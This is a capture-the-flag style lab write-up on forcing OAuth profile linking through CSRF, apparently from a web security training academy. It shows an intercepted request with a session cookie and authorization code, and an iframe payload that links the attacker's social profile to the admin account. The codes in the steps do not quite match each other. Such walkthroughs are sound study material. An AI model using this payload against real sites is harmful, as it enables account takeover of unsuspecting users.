## Forced OAuth profile linking

This lab gives you the option to attach a social media profile to your account so that you can log in via OAuth instead of using the normal username and password. Due to the insecure implementation of the OAuth flow by the client application, an attacker can manipulate this functionality to obtain access to other users' accounts.

To solve the lab, use a CSRF attack to attach your own social media profile to the admin user's account on the blog website, then access the admin panel and delete carlos.

The admin user will open anything you send from the exploit server and they always have an active session on the blog website.

You can log in to your own accounts using the following credentials:

Blog website account: wiener:peter
Social media profile: peter.wiener:hotdog

## Notes

- Possibility to leave a comment on a post
- Exploit server
- Login with social media
- Attach a social profile
- /admin

## Resume

1. Log in normally and start OAuth linking flow  
2. Intercept the authorization callback containing the `code`  
3. Copy the `/oauth-linking?code=...` URL  
4. Drop the request (important: keep the code valid)  
5. Create a malicious iframe pointing to the stolen URL  
6. Deliver exploit to victim  
7. Reuse social login to access admin account  

## Solve

The important request intercepted during the flow is:

```http
GET /oauth-login?code=uzcWptsnMZDw9H2gP6Lfbv8_wrKN6G-3JVTvv-swudu HTTP/2
Host: 0a32009804e78a9580490378004e006d.web-security-academy.net
Cookie: session=hVyUshk2Ur99utMH5Uk3QFkD1Rmu4GRF
```

This request contains the **authorization code**, which is reusable if not consumed.

We copy the final URL:

```text id="oauth_code_url"
https://0a32009804e78a9580490378004e006d.web-security-academy.net/oauth-linking?code=uzcWptsnMZDw9H2gP6Lfbv8_wrKN6G-3JVTvv-swudu
```

We then embed this URL inside an iframe hosted on the exploit server:

```html id="iframe_payload"
<iframe src="https://0a32009804e78a9580490378004e006d.web-security-academy.net/oauth-linking?code=xlalWAoNqaP4mxa_Vt4e4tVzS7s9U6smClHfYOgLEBG"></iframe>
```

When the victim loads the exploit page:

- Their browser automatically requests `/oauth-linking?code=...`
- The OAuth flow completes silently
- Their blog account is linked to the attacker’s social profile
- The attacker can now log in as admin using "Log in with social media"


After delivering the exploit:

- Go to blog login page  
- Click **Log in with social media**  
- You are logged in as **admin**  
- Access admin panel and delete `carlos`